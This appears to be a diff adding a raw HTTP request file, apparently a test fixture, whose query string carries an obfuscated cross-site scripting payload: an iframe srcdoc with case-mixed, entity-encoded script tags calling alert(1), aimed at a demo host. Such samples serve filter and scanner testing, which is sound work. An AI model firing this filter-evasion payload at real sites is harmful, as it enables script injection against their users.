@@ -1,0 +1,4 @@
+GET /a?q=<iFrAmE%20sRcDoC%3D"%26lT;sCrIpT%26gT;aLeRt(1)%26Lt;/ScRiPt%26Gt;"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
